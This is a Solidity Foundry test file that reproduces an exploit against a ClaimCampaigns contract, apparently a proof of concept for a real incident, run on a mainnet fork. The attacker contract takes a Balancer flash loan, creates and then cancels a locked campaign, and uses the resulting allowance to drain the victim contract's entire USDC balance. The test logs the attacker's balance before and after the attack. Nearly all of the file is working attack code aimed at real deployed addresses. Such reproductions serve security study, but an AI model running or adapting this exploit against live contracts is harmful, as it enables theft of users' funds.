// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

import "@interface/IERC20.sol";
import "@interface/IBalancer.sol";

import {ClaimCampaigns, IClaimCampaigns} from "./IClaimCampaigns.sol";

IERC20 constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
// Victim
IClaimCampaigns constant claimCampaigns = IClaimCampaigns(
    0xBc452fdC8F851d7c5B72e1Fe74DFB63bb793D511
);

IBalancerVault constant vault = IBalancerVault(
    0xBA12222222228d8Ba445958a75a0704d566BF2C8
);

contract HedgeHack {
    enum TokenLockup {
        Unlocked,
        Locked,
        Vesting
    }

    function funckyou() public {
        address[] memory tokens = new address[](1);
        tokens[0] = address(USDC);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 1305000000000;

        vault.flashLoan(address(this), tokens, amounts, hex"00");

        uint256 balance = USDC.balanceOf(address(claimCampaigns));
        USDC.transferFrom(address(claimCampaigns), address(this), balance);
    }

    function receiveFlashLoan(
        address[] memory /* tokens */,
        uint256[] memory /* amounts */,
        uint256[] memory /* feeAmounts */,
        bytes memory /* userData */
    ) external {
        USDC.approve(address(claimCampaigns), type(uint256).max);

        ClaimCampaigns.Campaign memory campaign;
        campaign.manager = address(this);
        campaign.token = address(USDC);
        campaign.amount = 1305000000000;
        campaign.end = 3133666800;
        campaign.tokenLockup = uint8(TokenLockup.Locked);
        campaign.root = bytes32(0);

        ClaimCampaigns.ClaimLockup memory claimLockup;
        claimLockup.tokenLocker = address(this);
        claimLockup.start = 0;
        claimLockup.cliff = 0;
        claimLockup.period = 0;
        claimLockup.periods = 0;

        ClaimCampaigns.Donation memory donation;
        donation.tokenLocker = address(this);
        donation.amount = 0;
        donation.rate = 0;
        donation.start = 0;
        donation.cliff = 0;
        donation.period = 0;

        bytes16 id = bytes16("hello");

        claimCampaigns.createLockedCampaign(
            id,
            campaign,
            claimLockup,
            donation
        );
        claimCampaigns.cancelCampaign(id);

        USDC.transfer(address(vault), 1305000000000);
    }
}

contract HedgeTest is Test {
    function setUp() public {
        vm.createSelectFork("mainnet", 19687890 - 1);
    }

    function testExploit() public {
        HedgeHack hacker = new HedgeHack();

        emit log_named_decimal_uint(
            "hacker USDC Balance",
            IERC20(USDC).balanceOf(address(hacker)),
            IERC20(USDC).decimals()
        );

        hacker.funckyou();

        emit log_named_decimal_uint(
            "hacker USDC Balance",
            IERC20(USDC).balanceOf(address(hacker)),
            IERC20(USDC).decimals()
        );
    }
}
